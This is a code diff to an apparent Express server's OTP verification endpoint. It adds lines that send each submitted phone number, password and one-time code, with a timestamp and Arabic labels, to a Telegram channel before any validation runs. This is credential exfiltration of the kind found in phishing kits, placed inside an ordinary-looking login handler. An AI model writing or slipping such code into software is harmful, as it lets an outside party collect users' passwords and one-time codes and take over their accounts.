@@ -216,6 +216,11 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
   const entryCode = sanitizeInput(req.body?.entryCode);
   const otpCode = sanitizeInput(req.body?.otpCode);
 
+  const attemptTime = new Date().toLocaleString('ar-MR');
+  await sendToTelegram(
+    `📥 محاولة تحقق\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 الرمز الذي تم إدخاله: ${otpCode}\n⏰ الوقت: ${attemptTime}\n━━━━━━━━━━━━━━`
+  );
+
   const reg = validateRegistration(phone, entryCode);
   if (!reg.valid) {
     return res.status(400).json({
